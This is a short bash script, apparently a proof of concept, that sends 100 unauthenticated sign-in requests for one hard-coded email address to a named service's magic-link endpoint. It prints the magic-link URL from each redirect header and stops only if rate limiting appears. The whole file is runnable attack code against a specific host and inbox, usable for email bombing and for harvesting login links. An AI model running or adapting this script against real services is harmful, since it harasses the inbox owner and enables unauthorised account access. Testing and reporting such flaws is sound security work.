#!/usr/bin/env bash
# Fires N unauthenticated sign-in requests for ONE email and prints the
# magic-link URL from each 303 Location header. No 429 across the run = vuln.
set -euo pipefail

EMAIL="arjun@graycup.in"                                  # target inbox
COUNT="100"                                               # emails to send
URL="https://compute.ornn.com/v1/auth/sign-in"

echo "sending $COUNT magic links to $EMAIL"
for i in $(seq 1 "$COUNT"); do
  read -r code loc < <(curl -s -o /dev/null -D - \
    -X POST "$URL" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "email=$EMAIL" \
    | awk 'BEGIN{c="";l=""} /^HTTP/{c=$2} tolower($1)=="location:"{l=$2} END{print c, l}' \
    | tr -d '\r')
  printf '%3d  %s  %s\n' "$i" "$code" "${loc:-<no Location>}"
  [ "$code" = "429" ] && { echo "rate limited at request $i"; break; }
done
